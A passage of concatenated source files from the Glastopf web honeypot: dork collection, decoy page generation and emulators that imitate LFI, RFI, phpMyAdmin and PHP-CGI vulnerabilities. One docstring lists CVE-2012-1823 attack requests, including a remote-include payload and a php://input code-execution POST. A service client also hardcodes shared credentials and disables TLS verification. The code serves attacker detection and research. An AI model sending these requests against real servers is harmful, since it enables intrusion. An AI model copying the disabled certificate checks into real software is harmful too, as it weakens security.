# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

import logging
from datetime import datetime
from sqlalchemy import Table, Column, Integer, String, MetaData
from sqlalchemy.sql import text
from sqlalchemy import select

logger = logging.getLogger(__name__)


class Database(object):
    """
    Responsible for all dork related communication with the glastopf sql database.
    """

    def __init__(self, engine):

        meta = MetaData()
        self.engine = engine

        self.tables = self.create(meta, self.engine)

    def select_data(self, pattern="rfi"):
        url_list = []

        data = self.get_pattern_requests_sql(pattern=pattern)
        data = list(set(data))

        for request in data:
            if request != None:
                url = request.split('=', 1)[0]
                url_list.append(url)
        return url_list

    def get_pattern_requests_sql(self, pattern="rfi"):
        return_list = []
        sql = text("SELECT request_url FROM events WHERE pattern = :x")
        results = self.engine.connect().execute(sql, x=pattern).fetchall()
        for row in results:
            return_list.append(row[0])
        return return_list

    def create(self, meta, engine):
        logger.debug('Creating SQLite database.')
        tables = {}
        tablenames = ["intitle", "intext", "inurl", "filetype", "ext", "allinurl"]
        for table in tablenames:
            tables[table] = Table(table, meta,
                                  Column('content', String(200), primary_key=True),
                                  Column('count', Integer),
                                  Column('firsttime', String(30)),
                                  Column('lasttime', String(30)),
            )
        meta.create_all(engine)
        return tables

    def insert_dorks(self, insert_list):
        logger.debug('Starting insert of {0} dorks into the database.'.format(len(insert_list)))
        if len(insert_list) == 0:
            return

        conn = self.engine.connect()
        trans = conn.begin()

        log = {}
        for item in insert_list:
            tablename = item['table']
            table = self.tables[tablename]
            content = item['content']

            if tablename not in log:
                log[tablename] = 0

            #skip empty
            if not content:
                continue

            dt_string = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            #check table if content exists - content is primary key.
            db_content = conn.execute(
                select([table]).
                where(table.c.content == content)).fetchone()
            if db_content is None:
                conn.execute(
                    table.insert().values({'content': content,
                                           'count': 1,
                                           'firsttime': dt_string,
                                           'lasttime': dt_string}))
                log[tablename] += 1
            else:
                #update existing entry
                conn.execute(
                    table.update().
                    where(table.c.content == content).
                    values(lasttime=dt_string,
                           count=table.c.count + 1))
        trans.commit()
        conn.close()
        logger.info('Done with insert of {0} dorks into the database.'.format(len(insert_list)))
        logger.debug('New dorks inserted: {0}'.format(log))

    def get_dork_list(self, tablename, starts_with=None):
        conn = self.engine.connect()
        table = self.tables[tablename]

        if starts_with is None:
            result = conn.execute(select([table]))
        else:
            result = conn.execute(
                table.select().
                where(table.c.content.like('%{0}'.format(starts_with))))

        return_list = []
        for entry in result:
            return_list.append(entry[0])
        logger.debug('Returned {0} dorks from the database (starts with: {1})'.format(len(return_list), starts_with))
        return return_list

########NEW FILE########
__FILENAME__ = dork_file_processor
# Copyright (C) 2013  Lukas Rist <glaslos@gmail.com>
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

import codecs
import re
import os
import unicodedata

package_directory = os.path.dirname(os.path.abspath(__file__))


class DorkFileProcessor(object):
    def __init__(self, dorkdb=None, dorks_file=os.path.join(package_directory, 'data/dorks.txt')):
        self.dorkdb = dorkdb
        self.dorks_file = dorks_file

    def get_lines(self):
        dork_lines = []
        with codecs.open(self.dorks_file, "r", "utf-8") as dork_list:
            for dork_line in dork_list.readlines():
                dork_line = dork_line.strip()
                if dork_line != "":
                    dork_lines.append(unicodedata.normalize('NFKD', dork_line).encode('ascii', 'ignore'))
        return dork_lines

    def extract_term(self, dork_line):
        if dork_line.startswith('"'):
            term = re.match('"([^"]+)"', dork_line)
            if term:
                term = term.group(1)
        elif dork_line.startswith("'"):
            term = re.match("'([^']+)'", dork_line)
            if term:
                term = term.group(1)
        else:
            term = dork_line.split(" ")[0]
        if term:
            term = term.strip()
        return term

    def parse_lines(self, dork_lines, ignores):
        search_opers = ('intitle:', 'inurl:', 'intext:', 'filetype:', 'ext:', 'allinurl:')
        inserts = []
        for dork_line in dork_lines:
            operator = next((oper for oper in search_opers if oper in dork_line), None)
            if operator != None:
                dork_line_split = dork_line.partition(operator)[2]
                table = operator[:-1]
                if table not in ignores:
                    inserts.append({'table': table, 'content': self.extract_term(dork_line_split)})
        return inserts

    def process_dorks(self, ignore=()):
        dork_lines = self.get_lines()
        return self.parse_lines(dork_lines, ignore)

########NEW FILE########
__FILENAME__ = dork_page_generator
# Copyright (C) 2012  Lukas Rist
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

from random import choice, shuffle
import hashlib
import codecs
import unicodedata
import random
import time
import os
import logging

from glastopf.modules.handlers.emulators.dork_list import gen_html
from glastopf.modules.handlers.emulators.surface import create_surface


logger = logging.getLogger(__name__)
package_directory = os.path.dirname(os.path.abspath(__file__))

INURL_MIN_SIZE = 500

class DorkPageGenerator(object):
    """
    Responsible for maintenance of dork pages and collection of dorks from requests.
    """

    def __init__(self,
                 database_instance,
                 dorks_file_processor_instance,
                 data_dir,
                 pages_dir=None,
                 mnem_service_instance=None):
        self.database = database_instance
        if not pages_dir:
            self.pages_path = os.path.join(data_dir, 'dork_pages')
        else:
            self.pages_path = os.path.join(pages_dir, 'dork_pages')
        if not os.path.isdir(self.pages_path):
            os.mkdir(self.pages_path, 0770)
        self.dork_file_processor = dorks_file_processor_instance
        self.mnem_service = mnem_service_instance

        #check if we need bootstrapping
        if len(self.database.get_dork_list('inurl')) <= INURL_MIN_SIZE:
            logger.info("Bootstrapping dork database.")
            self.bootstrap_dorkdb()
        self.enabled = True
        self.surface_creator = create_surface.SurfaceCreator(data_dir=data_dir)

    def prepare_text(self):
        line_list = []
        text_file = os.path.join(package_directory, 'data/pride.txt')
        with codecs.open(text_file, "r", "utf-8") as text_file:
            for text_line in text_file.readlines():
                text_line = text_line.strip()
                if text_line != "":
                    line_list.append(unicodedata.normalize('NFKD', text_line).encode('ascii', 'ignore'))
        return line_list

    def generate_dork_pages(self):
        new_pages = []
        line_list = self.prepare_text()
        shuffle(line_list)

        inurl_list = self.database.select_data()
        shuffle(inurl_list)
        #get data from dorkdb if the live database does not have enough
        if len(inurl_list) < INURL_MIN_SIZE:
            dork_seeds = random.sample(self.database.get_dork_list('inurl'), INURL_MIN_SIZE)
            inurl_list += dork_seeds
            assert(len(inurl_list) >= INURL_MIN_SIZE)

        intext_list = self.database.get_dork_list('intext')
        intitle_list = self.database.get_dork_list('intitle')

        # generate 5 dork pages
        for count_new_pages in range(5):
            body = ''
            # each page has 150 dork links
            for i in range(0, 150):
                if len(line_list) > 0 and len(inurl_list) > 0:
                    body += line_list.pop()
                    href = inurl_list.pop()
                    body += " <a href='%s'>%s</a> " % (href, choice(intext_list))
            dork_page = self.surface_creator.get_index(choice(intitle_list),
                                                           "/index",
                                                           body,
                                                           "Footer Powered By")
            page_md5 = hashlib.md5(dork_page).hexdigest()
            new_pages.append(page_md5)
            with codecs.open("{0}/{1}".format(self.pages_path, page_md5), "w", "utf-8") as dork_file:
                dork_file.write(dork_page)
        return new_pages

    def get_current_pages(self):
        dork_page_list = []
        for f in os.listdir(self.pages_path):
            if f.startswith("."):
                continue
            file_path = os.path.join(self.pages_path, f)
            if os.path.isfile(file_path):
                dork_page_list.append(file_path)
        return dork_page_list

    def regular_generate_dork(self, sleeper):
        sleep_time = sleeper * 60
        self._rotate_pages()
        if sleeper == 0:
            return
        if sleep_time < 60:
            sleep_time = 60
        while self.enabled:
            time.sleep(sleep_time)
            self._rotate_pages()

    def _rotate_pages(self):
        old_pages = self.get_current_pages()
        new_pages = self.generate_dork_pages()

        for file_full_path in old_pages:
            if not os.path.basename(file_full_path) in new_pages:
                try:
                    os.unlink(file_full_path)
                except Exception as e:
                    raise

    def collect_dork(self, attack_event):
        if attack_event.matched_pattern != "unknown":
            try:
                dork = attack_event.http_request.path.split('?')[0]
                self.database.insert_dorks([{'table': "inurl", 'content': dork}])
            except Exception as e:
                logger.exception("http_request split error: {0}".format(e))

    def bootstrap_dorkdb(self):
        logger.debug('Bootstrapping dork database.')
        ignore = ()
        dorks = []
        if self.mnem_service:
            #get dorks from mnemosyne - note: only 'inurl' at the moment
            dorks = self.mnem_service.get_dorks()
            if len(dorks) >= INURL_MIN_SIZE:
                logging.debug('Extracted enough "inurl" dorks from mnenosyne.')
                #all went well, do not extract inurl from file
                ignore = ('inurl')
            else:
                #something went wrong (nothing extracted from mnemosyne), extract all types from file
                logging.debug('Not enough "inurl" dorks extracted from mnenosyne.')
                ignore = ()

        #combine mnemosyne dorks with file dorks - accordingly to the ignore filter.
        dorks += self.dork_file_processor.process_dorks(ignore)
        self.database.insert_dorks(dorks)
        logger.debug('Finished bootstrapping dork database.')


########NEW FILE########
__FILENAME__ = gen_html
from string import Template


def html_template(titlename, formURLname, bodycontent, footstr):
    template = Template(u"""
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<title>${title}</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link href="style.css" rel="stylesheet" type="text/css" />
</head>
<body><div id="container">
      <fieldset><h1><center>${title}</center></h1></fieldset>
      <fieldset> 
      <form action="${form_URL}" method="post" class="niceform">
        <h2>Administrator Panel</h2>
        ${login_msg}
        <dl>
            <dt><label for="email">Login:</label></dt>
            <dd><input type="text" name="login" id="login" size="32" maxlength="20" /></dd>
        </dl>
        <dl>
            <dt><label for="password">Password:</label></dt>
            <dd><input type="password" name="password" id="password" size="32" maxlength="32" /></dd>
        </dl>
        <dl>
            <dt><input type="submit" name="submit" id="submit" value="Submit" /></dt>
        </dl>
        </form>
        </fieldset>
        <fieldset>
            <h2>My Resource</h2>
            <dl>
                <p>${bodystr}</p>
            </dl>
        </fieldset>
        <form action="comments" method="post" class="niceform">
        <fieldset> 
        <h2>Blog Comments</h2>
        <dl>
            <dl><label for="comments">Please post your comments for the blog</label></dl>
            <br/>
            <textarea name="comment" id="comment" rows="4" columns="300"> </textarea></dd>
        </dl>
        <dl>
            <dt><input type="submit" name="submit" id="submit" value="Submit" /></dt>
        </dl>
        ${comments}
        </fieldset></form>
        <fieldset>
            <dl><p id="footer">${footer}</p></dl>
        </fieldset>
</div></body>
</html>"""
    )
    return template.safe_substitute(
        dict(title=titlename, form_URL=formURLname, bodystr=bodycontent),
        footer=footstr)

########NEW FILE########
__FILENAME__ = mnem_service
# Copyright (C) 2013 Johnny Vestergaard <jkv@unixcluster.dk>
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

import requests
from requests.exceptions import Timeout, ConnectionError
import json
import logging

logger = logging.getLogger(__name__)


class Mnem_Service():
    #yes google hackers, these credentials are left here by purpose!
    def get_dorks(self, username='glastopf', password='glastopf', limit=1000, timeout=5):
        base_url = 'https://mnemosyne.honeycloud.net:8282'

        sess = requests.Session()
        try:
            #login and store session cookie
            payload = {'username': username, 'password': password}
            response = sess.post(base_url + '/login', payload, timeout=timeout, verify=False)
            if response.status_code != 200:
                logger.warning("Error while requesting session cookie from mnemosyne: {0}".format(response.status_code))
                return []

            #get the dorks
            response = sess.get(base_url + '/api/v1/aux/dorks?limit={0}'.format(limit), timeout=timeout, verify=False)

            if response.status_code == 200:
                dorks = json.loads(response.text)['dorks']
                logger.debug("Successfully retrieved {0} dorks from the mnemosyne service.".format(len(dorks)))
            else:
                logger.warning("Error while requesting dorks from mnemosyne: {0}".format(response.status_code))
                return []
        except (Timeout, ConnectionError) as e:
            logger.warning("Error while communication with mnemosyne: {0}".format(e))
            return []

        #align with glastopf db setup
        return_list = []
        for item in dorks:
            return_list.append({'content': item['content'],
                                'table': item['type']})
        return return_list

########NEW FILE########
__FILENAME__ = remote_exploits
# Copyright (C) 2012  Lukas Rist
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

import os
import re
import tarfile


class ExploitDB():
    def __init__(self, path='modules/handlers/emulators/dork_list/archive/platforms/php/webapps'):
        self.path = path
        self.vuln_list = []
        self.rfi_list = []

    def _extract_archive(self):
        if not os.path.exists(self.path.rsplit('/', 3)[0]):
            if self.path.split('/', 1)[0] == 'archive':
                tar = tarfile.open("archive.tar.gz")
                tar.extractall()
            else:
                tar = tarfile.open("modules/handlers/emulators/dork_list/archive.tar.gz")
                tar.extractall("modules/handlers/emulators/dork_list/")
            tar.close()

    def _get_exploits(self):
        return os.listdir(self.path)

    def _extract_paths(self, line):
        pattern = u'(http[s]?://[a-z]+?\.?[a-z]*)(/[^\s]+?\.[a-z]+)(\?)([^\s]+=[^\s]+)'
        regx = re.compile(pattern, re.IGNORECASE)
        matches = re.findall(regx, line)
        return [match[1] for match in matches if len(match[1]) > 0]

    def _select_line(self, line):
        if "/" in line:
            if "rfi" in line.lower():
                [self.rfi_list.append(vuln) for vuln in self._extract_paths(line)]
            else:
                [self.vuln_list.append(vuln) for vuln in self._extract_paths(line)]

    def _process_exploits(self):
        exploits = self._get_exploits()
        while len(exploits) > 0:
            exploit = exploits.pop()
            with open(os.path.join(self.path, exploit), 'r') as exploit_fp:
                lines = exploit_fp.readlines()
                [self._select_line(line) for line in lines]

    def _get_archive():
        "http://www.exploit-db.com/archive.tar.bz2"

    def get_dorks(self):
        self._get_archive()
        self._extract_archive()
        self._process_exploits()
        self.vuln_list = list(set(self.vuln_list))
        self.rfi_list = list(set(self.rfi_list))


if __name__ == '__main__':
    e = ExploitDB(path='archive/platforms/php/webapps')
    e.get_dorks()

########NEW FILE########
__FILENAME__ = dummy
# Copyright (C) 2012  Lukas Rist
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

from glastopf.modules.handlers import base_emulator


class DummyHandler(base_emulator.BaseEmulator):
    def __init__(self, data_dir):
        super(DummyHandler, self).__init__(data_dir)

    def handle(self, attack_event):
        attack_event.http_request.set_response("dummy response")


########NEW FILE########
__FILENAME__ = favicon_ico
# Copyright (C) 2012  Lukas Rist
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

from glastopf.modules.handlers import base_emulator
import os


class FaviconHandler(base_emulator.BaseEmulator):
    def __init__(self, data_dir):
        super(FaviconHandler, self).__init__(data_dir)

    def handle(self, attack_event):
        with open(os.path.join(self.data_dir, 'favicon/favicon.ico'), 'r') as favicon:
            data = favicon.read()
            attack_event.http_request.set_response(data, headers=(('Content-Type, image/x-icon'),))


########NEW FILE########
__FILENAME__ = file_server
# Copyright (C) 2012  Phani Vadrevu
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

import os

from glastopf.modules.handlers import base_emulator


class FileServer(base_emulator.BaseEmulator):
    def __init__(self, data_dir):
        super(FileServer, self).__init__(data_dir)

    def handle(self, attack_event):
        server_path = os.path.join(self.data_dir, 'server_files')
        request_file = attack_event.http_request.request_path.lstrip('/')
        if request_file == "":
            request_file = "index.html"
        response = ''
        if os.path.isfile(os.path.join(server_path, request_file)):
            with open(os.path.join(server_path, request_file), 'r') as f:
                response += f.read()
        #response with no content-type header
        attack_event.http_request.set_response(response, headers=())

########NEW FILE########
__FILENAME__ = head
# Copyright (C) 2012  Lukas Rist
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

from glastopf.modules.handlers import base_emulator


class HEADRequest(base_emulator.BaseEmulator):
    def __init__(self, data_dir):
        super(HEADRequest, self).__init__(data_dir)

    def handle(self, attack_event):
        attack_event.response = ""

########NEW FILE########
__FILENAME__ = lfi
# Copyright (C) 2011  Jeremy Heng
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

import re
import os

from glastopf.modules.handlers import base_emulator


class LFIEmulator(base_emulator.BaseEmulator):
    def __init__(self, data_dir):
        super(LFIEmulator, self).__init__(data_dir)

    def virtualdocs_whitelist(self):
        whitelist = []
        for root, subFolders, files in os.walk(os.path.join(self.data_dir, 'virtualdocs/')):
            for dir_file in files:
                whitelist.append(os.path.join(root, dir_file))
        return whitelist

    def clean_path(self, attack_event):
        return attack_event.http_request.request_url.split('\0', 1)[0]

    def file_path(self, cleaned_path):
        try:
            pattern = re.compile(r'(\.\./)*')
            result = pattern.split(cleaned_path, maxsplit=1)
            path = os.path.join(self.data_dir, 'virtualdocs/linux', result[2])
        except:
            path = None
        return path

    def handle(self, attack_event):
        path = self.file_path(self.clean_path(attack_event))
        print '---'
        print path
        try:
            if path in self.virtualdocs_whitelist():
                with open(path, "r") as f:
                    response = f.read()
                    attack_event.http_request.set_response(response)
            else:
                raise IOError
        except IOError:
            # TODO: Make it not finger printable
            # Place holder file not found error
            response = "Warning: include(vars1.php): failed to open stream: No such file or directory in /var/www/html/anonymous/test.php on line 6 Warning: include(): Failed opening 'vars1.php' for inclusion (include_path='.:/usr/share/pear:/usr/share/php') in /var/www/html/anonymous/test.php on line 6"
            attack_event.http_request.set_raw_response(response)
########NEW FILE########
__FILENAME__ = login
# Copyright (C) 2012  Phani Vadrevu
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

import os
from random import choice
import codecs
from urlparse import parse_qs
from string import Template

from glastopf.modules.handlers import base_emulator


class LoginEmulator(base_emulator.BaseEmulator):
    def __init__(self, data_dir):
        super(LoginEmulator, self).__init__(data_dir)

    def handle(self, attack_event):
        pages_dir = os.path.join(self.data_dir, 'dork_pages')
        dork_page_list = os.listdir(pages_dir)
        dork_page = choice(dork_page_list)
        with codecs.open(os.path.join(pages_dir, dork_page), "r", "utf-8") as dork_page:
            url_dict = parse_qs(attack_event.http_request.request_body)
            if ('login' in url_dict) or ('password' in url_dict):
                login_msg = "Incorrect login or password! Please try again."
            else:
                login_msg = ""
            with codecs.open(os.path.join(self.data_dir, 'comments.txt'), "r", "utf-8") as comments_txt:
                template = Template(dork_page.read())
                response = template.safe_substitute(
                    login_msg=login_msg,
                    comments=comments_txt.read())
            attack_event.http_request.set_response(response)

########NEW FILE########
__FILENAME__ = options
# Copyright (C) 2012  Lukas Rist
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

from glastopf.modules.handlers import base_emulator


class OPTIONSRequest(base_emulator.BaseEmulator):
    def __init__(self, data_dir):
        super(OPTIONSRequest, self).__init__(data_dir)

    def handle(self, attack_event):
        attack_event.set_response('', http_code=200, headers=(('Allow', 'OPTIONS, GET, HEAD, POST'),))

########NEW FILE########
__FILENAME__ = phpinfo
# Copyright (C) 2013  Enrico M.
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

from glastopf.modules.handlers import base_emulator
import os


class PHPInfoHandler(base_emulator.BaseEmulator):
    def __init__(self, data_dir):
        super(PHPInfoHandler, self).__init__(data_dir)

    def handle(self, attack_event):
        # The phpinfo simulator returns a static fake phpinfo() page, with
        # vulnerable software version (ex: PHP v 4.4.4)
        # TODO some information inside the static file can be made dynamic, different for every honeypot installation
        # Ex: Server version, server ip, modules versions, and so on
        robots_path = os.path.join(self.data_dir, 'phpinfo/phpinfo.html')
        with open(robots_path, 'r') as robot_file:
            response = robot_file.read()
        attack_event.http_request.set_response(response)
        return attack_event

########NEW FILE########
__FILENAME__ = phpmyadmin
# Copyright (C) 2012  Louis Liu
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

from string import Template
import hashlib
import time

from glastopf.modules.handlers import base_emulator
import os


class PMAEmulator(base_emulator.BaseEmulator):
    def __init__(self, data_dir):
        super(PMAEmulator, self).__init__(data_dir)

    def handle(self, attack_event, time_stamp=time.time()):
        path = os.path.join(self.data_dir, 'phpmyadmin/script_setup.php')
        with open(path, 'r') as setup_php:
            self.page = setup_php.read()
        m = hashlib.md5()
        m.update("%d" % time_stamp)
        page_template = Template(self.page)
        response = page_template.substitute(
            token_value=m.hexdigest() )
        attack_event.http_request.set_response(response)
        return attack_event

########NEW FILE########
__FILENAME__ = php_cgi_rce
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.


import hashlib
import os
from glastopf.modules.handlers import base_emulator

import glastopf.sandbox.sandbox as sandbox


class PHPCGIRCE(base_emulator.BaseEmulator):
    """
    Emulator for the PHP Remote code execution CVE-2012-1823

    Source disclosure:
    "GET /?-s HTTP/1.1"
    "GET /?-w HTTP/1.1"
    "GET /?-s+%3d HTTP/1.1"
    "GET /?-w+%3d HTTP/1.1"

    Code Execution
    "GET /?-d+auto_prepend_file=http://REMOTE_INCLUDE HTTP/1.1"
    "POST /-d+allow_url_include=on+-d+safe_mode=off+-d+open_basedir=off-d+auto_prepend_file=php://input HTTP/1.0

    <?php payload ?>
    "

    """

    def __init__(self, data_dir):
        super(PHPCGIRCE, self).__init__(data_dir)
        self.files_dir = os.path.join(self.data_dir, 'files/')
        if not os.path.exists(self.files_dir):
            os.mkdir(self.files_dir)

    # TODO duplicate code from rfi.py, refactor it
    def get_filename(self, php_code):
        file_name = hashlib.md5(php_code).hexdigest()
        return file_name

    def store_file(self, php_code):
        file_name = self.get_filename(php_code)
        if not os.path.exists(os.path.join(self.files_dir, file_name)):
            with open(os.path.join(self.files_dir, file_name), 'w+') as local_file:
                local_file.write(php_code)
        return file_name

    def handle(self, attack_event):

        php_source_code_s = """<code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php<br />page&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">$_GET</span><span style="color: #007700">[</span><span style="color: #DD0000">'page'</span><span style="color: #007700">];<br />include(</span><span style="color: #0000BB">page</span><span style="color: #007700">);<br /></span><span style="color: #0000BB">?&gt;<br /></span>
</span>"""

        php_source_code_w = """<?php
page = $_GET['page']; include(page); ?>"""

        query_dict = attack_event.http_request.request_query
        url = attack_event.http_request.request_url

        # php -h
        #   -s   Output HTML syntax highlighted source.
        #   -w   Output source with stripped comments and whitespace.
        if '-s' in query_dict or '-s+%3d' in query_dict:
            attack_event.http_request.set_raw_response(php_source_code_s)
            return attack_event

        if '-w' in query_dict or '-w+%3d' in query_dict:
            attack_event.http_request.set_raw_response(php_source_code_w)
            return attack_event

        # Handle remote code execution
        if attack_event.http_request.request_verb == "POST" and \
           "auto_prepend_file=php://input" in url and \
           '-d' in url:
            print 'good stuff'
            # Read the PHP POST payload calculate the md5 checksum and save the file
            # Then call the PHP sandbox and return the expected results
            # TODO verify if it's a valid PHP code?
            php_file_name = self.store_file(attack_event.http_request.request_body)
            response = sandbox.run(php_file_name, self.data_dir)
            print '---'
            print response
            attack_event.http_request.set_raw_response(response)
            print '---'
            return attack_event

        # fallback to display vulnerable source code
        attack_event.http_request.set_raw_response(php_source_code_w)
        return attack_event

########NEW FILE########
__FILENAME__ = rfi
# Copyright (C) 2012  Lukas Rist
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

import urllib2
import hashlib
import os
import re
import logging

import glastopf.sandbox.sandbox as sandbox
from glastopf.modules.handlers import base_emulator


logger = logging.getLogger(__name__)


class RFIEmulator(base_emulator.BaseEmulator):
    def __init__(self, data_dir):
        super(RFIEmulator, self).__init__(data_dir)
        self.files_dir = os.path.join(self.data_dir, 'files/')
        if not os.path.exists(self.files_dir):
            os.mkdir(self.files_dir)

